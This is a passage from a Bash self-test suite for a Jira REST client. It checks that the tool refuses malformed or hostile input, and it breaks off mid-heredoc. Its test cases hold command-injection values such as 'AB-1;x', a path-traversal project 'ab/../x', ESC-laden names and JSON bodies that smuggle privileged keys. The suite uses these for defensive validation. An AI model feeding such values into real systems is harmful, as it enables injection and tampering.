    echo "PASS: selftest — transition/other-failures: a POST 404 and a GET 400 keep rc 2 and today's 'unverified' sentence (only a POST 400 is rc 5)"
  else
    echo "FAIL: selftest — transition/other-failures (post404=$tf_ok1 get400=$tf_ok2)"; sfail=1
  fi
}

# _tj_trsmut <jq-filter>: transition-fields (AB-7, cloud) against the transitions fixture after the filter.
_tj_trsmut() {
  jq -c "$1" "$fixdir/transitions-with-fields.json" > "$tmpd/.cm-body"
  : > "$tmpd/.methods"; _tj_fx move-fields-400-tmp
  trm_rc=0; trm_out=$(tj_transition_fields "https://ex.atlassian.net" cloud AB-7 2>"$tmpd/trm.err") || trm_rc=$?
}

# _tj_st_transition_list: the transition-fields op — the required screen fields of each transition available to a card.
_tj_st_transition_list() {
  : > "$argvlog"; : > "$tmpd/.urls"; : > "$tmpd/.methods"; _tj_fx move-fields-400
  trl_rc=0; trl_out=$(tj_transition_fields "https://ex.atlassian.net" cloud AB-7 2>/dev/null) || trl_rc=$?
  if [ "$trl_rc" -eq 0 ] && [ "$trl_out" = "$(printf 'Done\tresolution\tunsupported\tResolution')" ] \
     && [ "$(sed -n '1p' "$tmpd/.urls")" = "https://ex.atlassian.net/rest/api/3/issue/AB-7/transitions?expand=transitions.fields" ] \
     && ! grep -q POST "$tmpd/.methods"; then
    echo "PASS: selftest — transition-fields/list: one line per required screen field (to.name, id, kind, name); a defaulted or optional field and a transition with none print nothing; GET-only"
  else
    echo "FAIL: selftest — transition-fields/list (rc=$trl_rc out='$trl_out')"; sfail=1
  fi
  _tj_trsmut '.transitions[1].fields.resolution.name = "Re|so" | .transitions[1].fields["bad id;x"] = {"required":true,"name":"Why","schema":{"type":"string"}} | .transitions[0].to.name = "A|B" | .transitions[0].fields.comment.required = true'
  if [ "$trm_rc" -eq 0 ] && [ "$trm_out" = "$(printf '?\tcomment\tstring\tComment\nDone\tresolution\tunsupported\t?')" ]; then
    echo "PASS: selftest — transition-fields/hostile: a non-sok name or to.name prints as '?', a malformed fieldId is dropped"
  else
    echo "FAIL: selftest — transition-fields/hostile (rc=$trm_rc out='$trm_out')"; sfail=1
  fi
  _tj_trsmut '.transitions[1].fields.resolution.required = "true"'
  if [ "$trm_rc" -eq 2 ] && [ -z "$trm_out" ]; then
    echo "PASS: selftest — transition-fields/shape: a non-boolean .required is unverified rc 2, nothing printed"
  else
    echo "FAIL: selftest — transition-fields/shape (rc=$trm_rc out='$trm_out')"; sfail=1
  fi
  : > "$argvlog"; trl_ok=1
  for trl_bad in AB-07 'AB-1;x' 'AB' 'ab-1' ''; do
    trl_rc=0; tj_transition_fields "https://ex.atlassian.net" cloud "$trl_bad" >/dev/null 2>&1 || trl_rc=$?
    [ "$trl_rc" -eq 1 ] || trl_ok=0
  done
  if [ "$trl_ok" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — transition-fields/args: a malformed issue key refuses rc 1 with zero requests"
  else
    echo "FAIL: selftest — transition-fields/args (all-rc1=$trl_ok dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
}

# _tj_st_getfields: get-fields — the post-read. Same S-4 id<->project match as get-issue.
_tj_st_getfields() {
  cm_url="https://ex.atlassian.net"
  gf_want=$(printf 'issuetype\tStory\nparent\tAB-5\ncustomfield_10043\tXS\ncustomfield_10044\tLow\nlabels\trisk:Low size:XS')
  : > "$argvlog"; _tj_fx gf-story
  gf_rc=0; gf_out=$(tj_get_fields "$cm_url" cloud AB AB-9 issuetype parent customfield_10043 customfield_10044 labels 2>/dev/null) || gf_rc=$?
  gf_lasturl=$(cat "$tmpd/.lasturl" 2>/dev/null || true)
  if [ "$gf_rc" -eq 0 ] && [ "$gf_out" = "$gf_want" ] \
     && [ "$gf_lasturl" = "$cm_url/rest/api/3/issue/AB-9?fields=project,issuetype,parent,customfield_10043,customfield_10044,labels" ]; then
    echo "PASS: selftest — get-fields/good: option -> .value, parent -> key, issuetype -> name, labels sorted+space-joined, in the requested order"
  else
    echo "FAIL: selftest — get-fields/good (rc=$gf_rc url='$gf_lasturl' out='$gf_out')"; sfail=1
  fi

  # the required-field kinds: priority name, component/version names, duedate, option / option-array / team id / user /
  # number / string customfields; an ADF text field is the word `present` only, never its content
  gf_want=$(printf 'priority\tHigh\ncomponents\tApi|Web\nfixVersions\tv2\nduedate\t2026-10-03\ncustomfield_10100\tBeta\ncustomfield_10101\tAlpha|Gamma\ncustomfield_10001\tteam-uuid-1\ncustomfield_10200\tabc123\ncustomfield_10300\t2.5\ncustomfield_10400\tpresent\ncustomfield_10500\tplain')
  _tj_fx gf-required
  gf_rc=0; gf_out=$(tj_get_fields "$cm_url" cloud AB AB-9 priority components fixVersions duedate customfield_10100 customfield_10101 customfield_10001 customfield_10200 customfield_10300 customfield_10400 customfield_10500 2>/dev/null) || gf_rc=$?
  if [ "$gf_rc" -eq 0 ] && [ "$gf_out" = "$gf_want" ]; then
    echo "PASS: selftest — get-fields/required-kinds: priority/components/fixVersions/duedate and option, option-array, team id, user, number, string customfields render; ADF text is 'present' only"
  else
    echo "FAIL: selftest — get-fields/required-kinds (rc=$gf_rc out='$gf_out')"; sfail=1
  fi
  # a hostile rendered value (control bytes in a priority name or an option value) is gated: rc 2, nothing echoed
  _tj_fx gf-hostile
  gf_rc1=0; gf_o1=$(tj_get_fields "$cm_url" cloud AB AB-9 priority 2>&1) || gf_rc1=$?
  gf_rc2=0; gf_o2=$(tj_get_fields "$cm_url" cloud AB AB-9 customfield_10100 2>&1) || gf_rc2=$?
  if [ "$gf_rc1" -eq 2 ] && [ "$gf_rc2" -eq 2 ] && [ "$gf_o1" = "unverified: get-fields response failed the expected shape" ] \
     && [ "$gf_o2" = "unverified: get-fields response failed the expected shape" ]; then
    echo "PASS: selftest — get-fields/required-hostile: a control byte in a rendered priority or option value is gated (rc 2, fixed sentence, value never echoed)"
  else
    echo "FAIL: selftest — get-fields/required-hostile (rc1=$gf_rc1 o1='$gf_o1' rc2=$gf_rc2 o2='$gf_o2')"; sfail=1
  fi

  # a response for a different key, or for a different project, is the fixed S-4 refusal
  _tj_fx gf-story
  gf_rc=0; gf_err=$(tj_get_fields "$cm_url" cloud AB AB-8 issuetype 2>&1 >/dev/null) || gf_rc=$?
  gf_rc2=0; gf_err2=$(tj_get_fields "$cm_url" cloud ZZ ZZ-9 issuetype 2>&1 >/dev/null) || gf_rc2=$?
  if [ "$gf_rc" -eq 1 ] && [ "$gf_err" = "refused: jira response key/project did not match the request" ] \
     && [ "$gf_rc2" -eq 1 ] && [ "$gf_err2" = "refused: jira response key/project did not match the request" ]; then
    echo "PASS: selftest — get-fields/spoofed: a response for another key or project is refused with the fixed sentence (S-4)"
  else
    echo "FAIL: selftest — get-fields/spoofed (rc=$gf_rc err='$gf_err' rc2=$gf_rc2 err2='$gf_err2')"; sfail=1
  fi

  # a field id outside the closed grammar, a cross-project id, no field at all: refused before any request
  : > "$argvlog"
  gf_rc1=0; tj_get_fields "$cm_url" cloud AB AB-9 'customfield_1";x' >/dev/null 2>&1 || gf_rc1=$?
  gf_rc2=0; tj_get_fields "$cm_url" cloud AB ZZ-9 issuetype >/dev/null 2>&1 || gf_rc2=$?
  gf_rc3=0; tj_get_fields "$cm_url" cloud AB AB-9 >/dev/null 2>&1 || gf_rc3=$?
  gf_rc4=0; tj_get_fields "$cm_url" cloud AB AB-9 description >/dev/null 2>&1 || gf_rc4=$?
  if [ "$gf_rc1" -eq 1 ] && [ "$gf_rc2" -eq 1 ] && [ "$gf_rc3" -eq 1 ] && [ "$gf_rc4" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — get-fields/arg-grammar: a bad field id, a cross-project id, no field, an unrenderable field refuse rc 1 with zero requests"
  else
    echo "FAIL: selftest — get-fields/arg-grammar ($gf_rc1 $gf_rc2 $gf_rc3 $gf_rc4 dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
}

# _tj_st_createfrag: tj_create merges the CALLER's fields fragment under .fields (no interpolation, S-8).
_tj_st_createfrag() {
  cm_url="https://ex.atlassian.net"
  cf_frag='{"customfield_10046":{"value":"S"},"parent":{"key":"AB-5"},"description":"d"}'
  cf_want='{"fields":{"project":{"key":"AB"},"summary":"a new row","issuetype":{"name":"Task"},"customfield_10046":{"value":"S"},"parent":{"key":"AB-5"},"description":"d"}}'
  : > "$argvlog"; : > "$tmpd/.methods"; _tj_fx create-good
  cf_rc=0; cf_out=$(tj_create "$cm_url" cloud AB "a new row" Task "$cf_frag" 2>/dev/null) || cf_rc=$?
  cf_body=$(jq -c . "$tmpd/.lastbody" 2>/dev/null || true)
  if [ "$cf_rc" -eq 0 ] && [ "$cf_out" = "AB-99" ] && [ "$cf_body" = "$cf_want" ] && [ "$(cat "$tmpd/.methods")" = "POST" ]; then
    echo "PASS: selftest — create/fragment: the caller's fragment lands under .fields beside project, summary and issuetype, in one POST"
  else
    echo "FAIL: selftest — create/fragment (rc=$cf_rc out='$cf_out' body='$cf_body')"; sfail=1
  fi

  # the fragment KEY allowlist {labels, parent, description, customfield_<1-10 digits>}: reporter, security,
  # project, an over-long customfield id are refused rc 1 with ZERO requests (never merged, never overridden)
  : > "$argvlog"
  cf_bad=0
  for cf_k in '{"reporter":{"id":"x"}}' '{"security":{"id":"1"}}' '{"project":{"key":"ZZ"}}' '{"customfield_12345678901":"x"}' '{"customfield_":"x"}' '{"labels":["a"],"assignee":{"id":"x"}}'; do
    cf_rc=0; tj_create "$cm_url" cloud AB "t" Task "$cf_k" >/dev/null 2>"$tmpd/cf.err" || cf_rc=$?
    [ "$cf_rc" -eq 1 ] && [ "$(cat "$tmpd/cf.err")" = "refused: the create fields fragment carries a key outside the allowed set" ] || cf_bad=1
  done
  # more than ONE JSON document (jq -e judges only the last), or a non-object: refused, zero requests — via
  # argv AND via stdin. The first document carries the privileged key in the two-document cases.
  for cf_k in '{"reporter":{"id":"x"}}{}' '{}{"security":{"id":"1"}}' '{} {}' '[]'; do
    cf_rc=0; tj_create "$cm_url" cloud AB "t" Task "$cf_k" >/dev/null 2>"$tmpd/cf.err" || cf_rc=$?
    [ "$cf_rc" -eq 1 ] && [ "$(cat "$tmpd/cf.err")" = "refused: the create fields fragment is not exactly one JSON object" ] || cf_bad=1
    cf_rc=0; printf '%s' "$cf_k" | tj_create "$cm_url" cloud AB "t" Task - >/dev/null 2>"$tmpd/cf.err" || cf_rc=$?
    [ "$cf_rc" -eq 1 ] && [ "$(cat "$tmpd/cf.err")" = "refused: the create fields fragment is not exactly one JSON object" ] || cf_bad=1
  done
  # stdin over 256 KiB is refused, not truncated into something that parses
  cf_rc=0; awk 'BEGIN{printf "{\"description\":\""; for(i=0;i<262200;i++) printf "a"; printf "\"}"}' | tj_create "$cm_url" cloud AB "t" Task - >/dev/null 2>"$tmpd/cf.err" || cf_rc=$?
  [ "$cf_rc" -eq 1 ] && [ "$(cat "$tmpd/cf.err")" = "refused: the create fields fragment is over the 256 KiB bound" ] || cf_bad=1
  if [ "$cf_bad" -eq 0 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — create/fragment-keys: reporter, security, project, assignee, a bad customfield id are each refused rc 1 with zero requests"
  else
    echo "FAIL: selftest — create/fragment-keys (bad=$cf_bad dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi

  # a fragment over 128 KiB (Linux MAX_ARG_STRLEN) must reach the POST body intact: it may never ride exec argv.
  # Behavioural (a 200000-byte description through stdin) AND structural (the body builder has no argv-JSON flag).
  cf_bigf=$(awk 'BEGIN{printf "{\"description\":\""; for(i=0;i<200000;i++) printf "a"; printf "\"}"}')
  _tj_fx create-good
  printf '%s' "$cf_bigf" | tj_create "$cm_url" cloud AB "a new row" 10003 - >/dev/null 2>&1 || true
  cf_biglen=$(jq -r '.fields.description | length' "$tmpd/.lastbody" 2>/dev/null || echo 0)
  cf_flag='--arg'; cf_flag="${cf_flag}json"
  cf_fnbody=$(awk '/^_tj_cr_body\(\) \{/ { on = 1 } on { print } on && /^}/ { exit }' "$0")
  cf_flagcount=$(printf '%s\n' "$cf_fnbody" | grep -c -e "$cf_flag" || true)
  if [ "$cf_biglen" -eq 200000 ] && [ -n "$cf_fnbody" ] && [ "$cf_flagcount" -eq 0 ]; then
    echo "PASS: selftest — create/big-fragment: a 200000-byte description fragment reaches the POST body intact, and _tj_cr_body carries no argv-JSON flag (structural pin)"
  else
    echo "FAIL: selftest — create/big-fragment (len=$cf_biglen fnbody-bytes=$(printf '%s' "$cf_fnbody" | wc -c | tr -d ' ') flagcount=$cf_flagcount)"; sfail=1
  fi

  # the type goes by numeric ID when given ({id}), by name otherwise; the fragment may arrive on STDIN (`-`)
  _tj_fx create-good
  printf '%s' "$cf_frag" | tj_create "$cm_url" cloud AB "a new row" 10003 - >/dev/null 2>&1 || true
  cf_body=$(jq -c . "$tmpd/.lastbody" 2>/dev/null || true)
  if [ "$cf_body" = '{"fields":{"project":{"key":"AB"},"summary":"a new row","issuetype":{"id":"10003"},"customfield_10046":{"value":"S"},"parent":{"key":"AB-5"},"description":"d"}}' ]; then
    echo "PASS: selftest — create/type-id: a numeric type is sent as {id}, and a fragment on stdin ('-') merges like an argument one"
  else
    echo "FAIL: selftest — create/type-id (body='$cf_body')"; sfail=1
  fi

  # an absent type defaults to Task; a type with a quote, or a fragment that is not an object, refuses pre-request
  _tj_fx create-good
  tj_create "$cm_url" cloud AB "a new row" >/dev/null 2>&1 || true
  cf_body=$(jq -c . "$tmpd/.lastbody" 2>/dev/null || true)
  : > "$argvlog"
  cf_rc1=0; tj_create "$cm_url" cloud AB "t" 'Ta"sk' >/dev/null 2>&1 || cf_rc1=$?
  cf_rc2=0; tj_create "$cm_url" cloud AB "t" Task '[1]' >/dev/null 2>&1 || cf_rc2=$?
  cf_rc3=0; tj_create "$cm_url" cloud AB "t" Task 'not json' >/dev/null 2>&1 || cf_rc3=$?
  if [ "$cf_body" = '{"fields":{"project":{"key":"AB"},"summary":"a new row","issuetype":{"name":"Task"}}}' ] \
     && [ "$cf_rc1" -eq 1 ] && [ "$cf_rc2" -eq 1 ] && [ "$cf_rc3" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — create/args: no type -> Task; a quote in the type, a non-object fragment, non-JSON each refuse rc 1 with zero requests"
  else
    echo "FAIL: selftest — create/args (body='$cf_body' rc=$cf_rc1/$cf_rc2/$cf_rc3 dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi
}
_tj_st_status_ids() {

  # --- T2a leg 1: status-ids Cloud -> ops/status-ids-cloud.out (id<TAB>name, dedup by id, sorted) ---
  _tj_fx status-ids-cloud
  sidout="$tmpd/status-ids-cloud.actual"
  rc=0
  tj_status_ids https://ex.atlassian.net cloud AB > "$sidout" 2>/dev/null || rc=$?
  if [ "$rc" -eq 0 ] && cmp -s "$sidout" "$fixdir/ops/status-ids-cloud.out"; then
    echo "PASS: selftest — status-ids (Cloud) matches ops/status-ids-cloud.out byte-for-byte (T2a leg 1)"
  else
    echo "FAIL: selftest — status-ids (Cloud) did not match ops/status-ids-cloud.out (rc=$rc)"; sfail=1
  fi

  # --- T2a leg 2: status-ids DC -> ops/status-ids-dc.out, and DC uses /rest/api/2/ ---
  _tj_fx status-ids-dc
  sidout_dc="$tmpd/status-ids-dc.actual"
  rc=0
  tj_status_ids https://ex.example.com datacenter AB > "$sidout_dc" 2>/dev/null || rc=$?
  if [ "$rc" -eq 0 ] && cmp -s "$sidout_dc" "$fixdir/ops/status-ids-dc.out" && grep -q '/rest/api/2/' "$tmpd/.lasturl" 2>/dev/null; then
    echo "PASS: selftest — status-ids (DC) matches ops/status-ids-dc.out and used /rest/api/2/ (T2a leg 2)"
  else
    echo "FAIL: selftest — status-ids (DC) did not match ops/status-ids-dc.out or used the wrong REST base (rc=$rc)"; sfail=1
  fi

  # --- T2a leg 3: a hostile status name (quote + ESC) -> rc 2, stdout empty, no ESC on stderr ---
  _tj_fx status-ids-hostile-name
  rc=0
  leg3err="$tmpd/.leg3err"
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg3err") || rc=$?
  err=$(cat "$leg3err" 2>/dev/null || true)
  if [ "$rc" -eq 2 ] && [ -z "$out" ] && ! printf '%s' "$err" | grep -q "$(printf '\033')"; then
    echo "PASS: selftest — a hostile status name (quote/ESC) yields rc 2, empty stdout, no ESC on stderr (T2a leg 3)"
  else
    echo "FAIL: selftest — a hostile status name was not cleanly refused (rc=$rc out='$out')"; sfail=1
  fi

  # --- T2a leg 4: an error-object body -> rc 2, stdout empty, refused BY THE SHAPE CHECK
  # specifically (the sentence is pinned so this leg cannot be satisfied by the unrelated
  # pairs-extraction guard alone — measured: without this pin, mutant M1 [drop the shape check]
  # stayed green because the malformed body ALSO fails jq's own `.[].statuses[]` iteration and
  # is caught by leg 6's guard instead, with the same rc/emptiness but a different sentence). ---
  _tj_fx status-ids-error-object
  rc=0
  leg4err="$tmpd/.leg4err"
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg4err") || rc=$?
  err=$(cat "$leg4err" 2>/dev/null || true)
  if [ "$rc" -eq 2 ] && [ -z "$out" ] && printf '%s' "$err" | grep -q "failed the expected shape"; then
    echo "PASS: selftest — an error-object body yields rc 2, empty stdout, refused by the shape check (T2a leg 4)"
  else
    echo "FAIL: selftest — an error-object body did not yield rc 2/empty/shape-refused (rc=$rc out='$out' err='$err')"; sfail=1
  fi

  # --- T2a leg 5: a top-level non-array body, and an issue type whose statuses is not an array ---
  # (nonarray + bad-shape) -> rc 2, stdout empty, refused BY THE SHAPE CHECK (same pin as leg 4;
  # bad-shape is the sub-case that specifically needs the `all(...)` half of the check, since its
  # top level IS an array — leg 4's narrower `type=="array"` alone would not catch it).
  _tj_fx status-ids-nonarray
  rc=0
  leg5err="$tmpd/.leg5err"
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg5err") || rc=$?
  err=$(cat "$leg5err" 2>/dev/null || true)
  leg5ok=1
  { [ "$rc" -eq 2 ] && [ -z "$out" ] && printf '%s' "$err" | grep -q "failed the expected shape"; } || leg5ok=0
  _tj_fx status-ids-bad-shape
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg5err") || rc=$?
  err=$(cat "$leg5err" 2>/dev/null || true)
  { [ "$rc" -eq 2 ] && [ -z "$out" ] && printf '%s' "$err" | grep -q "failed the expected shape"; } || leg5ok=0
  [ "$leg5ok" -eq 1 ] && echo "PASS: selftest — a non-array body and an issue type with non-array statuses both yield rc 2, empty stdout, shape-refused (T2a leg 5)" \
    || { echo "FAIL: selftest — a non-array/bad-shape statuses response was not cleanly shape-refused (rc=$rc out='$out' err='$err')"; sfail=1; }

  # --- T2a leg 6 (fix1 F-1e strengthened): a name @tsv cannot format (an object, not a string)
  # mid-stream -> rc 2, never a silently short list, and stderr must carry the FIXED sentence and
  # must NEVER leak the tracker's own bytes (S-6) — pinned so a raw jq error (which would echo the
  # object literally, e.g. `object ({"nested":...})`) cannot satisfy this leg by accident ---
  _tj_fx status-ids-unformattable
  rc=0
  leg6err="$tmpd/.leg6err"
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg6err") || rc=$?
  err=$(cat "$leg6err" 2>/dev/null || true)
  [ "$rc" -eq 2 ] && [ -z "$out" ] && printf '%s' "$err" | grep -q "failed the expected shape" \
    && ! printf '%s' "$err" | grep -q "nested" \
    && echo "PASS: selftest — a name @tsv cannot format yields rc 2, never a silently short list, no tracker bytes on stderr (T2a leg 6 / fix1 F-1e)" \
    || { echo "FAIL: selftest — an unformattable name did not yield rc 2/empty/shape-refused/clean stderr (rc=$rc out='$out' err='$err')"; sfail=1; }

  # --- T2a leg 7: one id carrying two different names -> rc 2, stdout empty ---
  _tj_fx status-ids-same-id-two-names
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — one id carrying two different names yields rc 2, empty stdout (T2a leg 7)" \
    || { echo "FAIL: selftest — one id with two names was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- T2c leg 5 (ruling R3): two DIFFERENT ids sharing ONE name -> BOTH pairs emitted (never
  # deduped/collapsed) -> stdout FILE cmp'd against ops/status-ids-dupname.out, rc 0. -----------------
  opsdir="$fixdir/ops"
  _tj_fx status-ids-dupname
  l5_rc=0
  tj_status_ids https://ex.atlassian.net cloud AB > "$tmpd/l5.out" 2>"$tmpd/l5.err" || l5_rc=$?
  l5_ok=0; [ "$l5_rc" -eq 0 ] && cmp -s "$tmpd/l5.out" "$opsdir/status-ids-dupname.out" && l5_ok=1
  if [ "$l5_ok" -eq 1 ]; then
    echo "PASS: selftest — two ids sharing one name emit BOTH pairs, matching ops/status-ids-dupname.out, rc 0 (T2c leg 5 / ruling R3)"
  else
    echo "FAIL: selftest — two ids sharing one name did not match ops/status-ids-dupname.out (rc=$l5_rc out='$(cat "$tmpd/l5.out" 2>/dev/null)' err='$(cat "$tmpd/l5.err" 2>/dev/null)')"; sfail=1
  fi

  # --- T2a leg 8: a hostile project ("ab/../x") is refused before ANY request (S-4-style
  # defence-in-depth over the conf's own project check) — rc 1, argv log stays empty ---
  : > "$argvlog"
  rc=0
  tj_status_ids https://ex.atlassian.net cloud "ab/../x" >/dev/null 2>&1 || rc=$?
  if [ "$rc" -eq 1 ] && [ ! -s "$argvlog" ]; then
    echo "PASS: selftest — a hostile project ('ab/../x') is refused before any request (T2a leg 8)"
  else
    echo "FAIL: selftest — a hostile project was not refused pre-request (rc=$rc, dispatched=$([ -s "$argvlog" ] && echo yes || echo no))"; sfail=1
  fi

  # --- T2a leg 9: _tj_cap_ok direct — 0/007/123456/empty/12a refused; 1/200/99999 accepted ---
  leg9ok=1
  for v in 0 007 123456 "" 12a; do
    if _tj_cap_ok "$v" 2>/dev/null; then leg9ok=0; fi
  done
  for v in 1 200 99999; do
    _tj_cap_ok "$v" 2>/dev/null || leg9ok=0
  done
  [ "$leg9ok" -eq 1 ] && echo "PASS: selftest — _tj_cap_ok refuses 0/007/123456/empty/12a and accepts 1/200/99999 (T2a leg 9)" \
    || { echo "FAIL: selftest — _tj_cap_ok did not match the expected accept/refuse set"; sfail=1; }

  # --- T2a leg 10: a non-numeric status id in the response -> that pair refused, rc 2, empty stdout
  # (fixture added beyond the brief's declared 7 — see the report's ambiguity note) ---
  _tj_fx status-ids-nonnumeric-id
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a non-numeric status id is refused, rc 2, empty stdout (T2a leg 10)" \
    || { echo "FAIL: selftest — a non-numeric status id was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-1a: a two-document body (a stream of two JSON values) -> rc 2, empty stdout — a
  # plain (non-slurped) jq shape check applies its filter per-document and can be fooled into
  # silently merging a smuggled second document's statuses (I-3/I-1, S-6 invariant 3) ---
  _tj_fx status-ids-two-documents
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a two-document body yields rc 2, empty stdout (fix1 F-1a)" \
    || { echo "FAIL: selftest — a two-document body was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-1b: a status name that is a JSON number, not a string -> rc 2, empty stdout (jq's
  # @tsv silently stringifies a number, so an all-digit non-string name would otherwise sail
  # through the character-grammar check too) ---
  _tj_fx status-ids-nonstring-name
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a non-string status name yields rc 2, empty stdout (fix1 F-1b)" \
    || { echo "FAIL: selftest — a non-string status name was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-1c: a status id that is a JSON number, not a string -> rc 2, empty stdout (jq's
  # @tsv stringifies it identically to a real string id, so it would otherwise pass the digit-only
  # grammar downstream unnoticed) ---
  _tj_fx status-ids-nonstring-id
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a non-string status id yields rc 2, empty stdout (fix1 F-1c)" \
    || { echo "FAIL: selftest — a non-string status id was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1 F-1d: a status array element that is not an object at all -> rc 2, empty stdout,
  # refused BY THE SHAPE CHECK's own fixed sentence (not a generic extraction-guard leak) ---
  _tj_fx status-ids-nonobject-status
  rc=0
  leg1derr="$tmpd/.leg1derr"
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$leg1derr") || rc=$?
  err=$(cat "$leg1derr" 2>/dev/null || true)
  if [ "$rc" -eq 2 ] && [ -z "$out" ] && printf '%s' "$err" | grep -q "failed the expected shape"; then
    echo "PASS: selftest — a non-object status element yields rc 2, empty stdout, shape-refused (fix1 F-1d)"
  else
    echo "FAIL: selftest — a non-object status element was not cleanly shape-refused (rc=$rc out='$out' err='$err')"; sfail=1
  fi

  # --- fix1 F-2: a leading-zero status id ("03") alongside a proper one ("3"), both orders ->
  # rc 2, empty stdout (F-1's \A[1-9][0-9]*\z numeric grammar should already close this) ---
  _tj_fx status-ids-leading-zero
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a leading-zero status id ('3' then '03') yields rc 2, empty stdout (fix1 F-2a)" \
    || { echo "FAIL: selftest — a leading-zero status id ('3' then '03') was not refused (rc=$rc out='$out')"; sfail=1; }

  _tj_fx status-ids-leading-zero-rev
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a leading-zero status id ('03' then '3') yields rc 2, empty stdout (fix1 F-2b)" \
    || { echo "FAIL: selftest — a leading-zero status id ('03' then '3') was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1: an id with an embedded trailing newline ("3\n") -> rc 2, empty stdout. Pins WHY \A…\z
  # (not ^…$) is required — added while working the required-mutant "^…$ instead of \A…\z": jq's
  # `"3\n" | test("^[1-9][0-9]*$")` is TRUE (multi-line-lax `^`/`$`), while `\A…\z` correctly
  # anchors to the absolute string boundaries and refuses it. Verified directly with jq before
  # wiring in: `"3\n" | test("^[1-9][0-9]*$")` -> true; `"3\n" | test("\A[1-9][0-9]*\z")` -> false.
  _tj_fx status-ids-id-newline
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — an id with an embedded newline yields rc 2, empty stdout (fix1 anchor-pin)" \
    || { echo "FAIL: selftest — an id with an embedded newline was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- fix1: a NAME with an embedded trailing newline ("Foo\n") -> rc 2, empty stdout. Unlike the
  # id (which is ALSO caught by the redundant shell-side _tj_status_id_ok digit check regardless of
  # anchor style — confirmed empirically: that leg alone does NOT distinguish \A…\z from ^…$), the
  # name grammar has NO shell-side fallback since F-4 moved it entirely into jq — so this is the
  # leg that actually isolates the anchor-style requirement for the required mutant. Verified with
  # jq directly: `"Foo\n" | test("^[A-Za-z0-9 _'-]{1,60}$")` -> true (BUG); `test("\A…\z")` -> false.
  _tj_fx status-ids-name-newline
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>/dev/null) || rc=$?
  [ "$rc" -eq 2 ] && [ -z "$out" ] && echo "PASS: selftest — a name with an embedded newline yields rc 2, empty stdout (fix1 anchor-pin-2)" \
    || { echo "FAIL: selftest — a name with an embedded newline was not refused (rc=$rc out='$out')"; sfail=1; }

  # --- T2c0 item 7 (T2a seat L-2): an empty catalogue ([]) passes the shape check VACUOUSLY and
  # would otherwise print nothing with rc 0 — refuse instead. ---------------------------------------
  _tj_fx status-ids-empty-catalogue
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$tmpd/item7a.err") || rc=$?
  err=$(cat "$tmpd/item7a.err" 2>/dev/null)
  [ "$rc" -eq 2 ] && [ -z "$out" ] && [ "$err" = "unverified: the project has no statuses" ] \
    && echo "PASS: selftest — an empty catalogue ('[]') yields rc 2, empty stdout, the fixed sentence (T2c0 item 7)" \
    || { echo "FAIL: selftest — an empty catalogue was not refused (rc=$rc out='$out' err='$err')"; sfail=1; }

  # --- T2c0 item 7 (T2a seat L-2): every issue type present but each with statuses:[] -- the SAME
  # silent-empty shape, one level deeper. ------------------------------------------------------------
  _tj_fx status-ids-all-empty
  rc=0
  out=$(tj_status_ids https://ex.atlassian.net cloud AB 2>"$tmpd/item7b.err") || rc=$?
  err=$(cat "$tmpd/item7b.err" 2>/dev/null)
  [ "$rc" -eq 2 ] && [ -z "$out" ] && [ "$err" = "unverified: the project has no statuses" ] \
    && echo "PASS: selftest — an all-statuses:[] catalogue yields rc 2, empty stdout, the fixed sentence (T2c0 item 7)" \
    || { echo "FAIL: selftest — an all-statuses:[] catalogue was not refused (rc=$rc out='$out' err='$err')"; sfail=1; }

  # --- T2c0 item 8 (T2a seat L-3): the final `LC_ALL=C sort` guarded — a PATH-level `sort` wrapper
  # (root-safe: an unconditional exit, never a permission bit) faults it. ---------------------------
  s8bin="$tmpd/s8bin"; mkdir -p "$s8bin"
  cat > "$s8bin/sort" <<'SORTFAULTEOF'
#!/bin/sh
